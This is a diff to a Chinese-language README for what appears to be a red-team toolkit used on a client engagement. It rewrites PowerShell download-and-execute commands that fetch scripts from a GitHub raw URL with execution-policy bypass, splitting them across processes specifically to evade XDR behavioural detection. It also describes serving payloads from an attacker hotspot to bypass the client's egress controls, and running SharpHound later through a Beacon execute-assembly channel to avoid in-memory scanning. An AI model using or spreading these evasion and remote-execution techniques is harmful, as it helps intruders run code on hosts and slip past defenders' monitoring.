@@ -73,11 +73,15 @@ day2-kit/
 
 仓库已做纯文本化（无 exe/zip 二进制；SharpHound 以内嵌程序集的 `SharpHound.ps1` 形式存在）。
 
-1. **raw 逐文件拉取（首选）**：网关通常只拦 exe/zip，text/plain 能过。
+1. **两段式拉取（首选，XDR 友好）**：下载与执行分进程，不形成行为链。
    ```powershell
-   powershell -ep bypass -c "iex (iwr https://raw.githubusercontent.com/tiaodan577-glitch/day2-kit/main/ps1/Get-Kit.ps1)"
+   # 取下载器（纯下载，无执行）
+   powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/tiaodan577-glitch/day2-kit/main/ps1/Get-Files.ps1', \"$env:TEMP\gf.ps1\")"
+   # 新进程执行下载器
+   powershell -ep bypass -f "$env:TEMP\gf.ps1"
    ```
-   全套落到 `%TEMP%\day2-kit`，顺带定义 `Invoke-BloodHoundFromRepo`（内存执行，不落 exe）。
+   全套落到 `%TEMP%\day2-kit`。之后再开新进程执行其中的脚本。
+   （`Get-Kit.ps1` 保留，但它带 `Invoke-BloodHoundFromRepo` 定义，XDR 敏感期用 `Get-Files.ps1`。）
 
 2. **zip 整包（若网关只按扩展名拦 exe）**：主分支已无二进制，可重试
    `https://github.com/tiaodan577-glitch/day2-kit/archive/refs/heads/main.zip`
@@ -85,6 +89,27 @@ day2-kit/
 
 3. **热点 HTTP 兜底（Day1 已验证）**：攻击机 `python3 -m http.server 8000`（只绑热点网段），
    测试机 PowerShell 从热点地址拉 zip/逐文件，完全不走客户出网设备。
+
+## 远程加载被 XDR 杀时（行为层）
+
+cradle 死因：同一进程里「下载 → 解码 → 执行」的行为链是 XDR 的经典规则，
+`iex (iwr ...)` 这种写法在命令行/脚本块日志里一眼可辨。改成**两段式 + 换进程**：
+
+```powershell
+# 1) 只下载，不执行（无 cradle 特征）
+powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/tiaodan577-glitch/day2-kit/main/ps1/Get-Files.ps1', \"$env:TEMP\gf.ps1\")"
+# 2) 新进程执行下载器，把全套取回本地
+powershell -ep bypass -f "$env:TEMP\gf.ps1"
+# 3) 再开一个新进程，从磁盘跑（进程间不共享行为链）
+powershell -ep bypass -f "$env:TEMP\day2-kit\ps1\Get-LocalRecon.ps1"
+```
+
+或者干脆走热点 HTTP（Day1 已验证）：拉取行为本身不出现在客户出网链路。
+
+**SharpHound 暂缓**：`Assembly.Load` 后 XDR 会扫内存里的程序集类型名，SharpHound 的
+类型元数据是记了特征的——base64 只解决落地/AMSI，解决不了内存识别。域内信息先用
+变形版 PowerView 顶（信任/ACL/委派/用户都有）；SharpHound 等 Beacon 通道建好后
+走 execute-assembly/BOF 再跑，那条链路的进程上下文完全不同。
 
 ## 脚本被杀时怎么办（分诊）
 
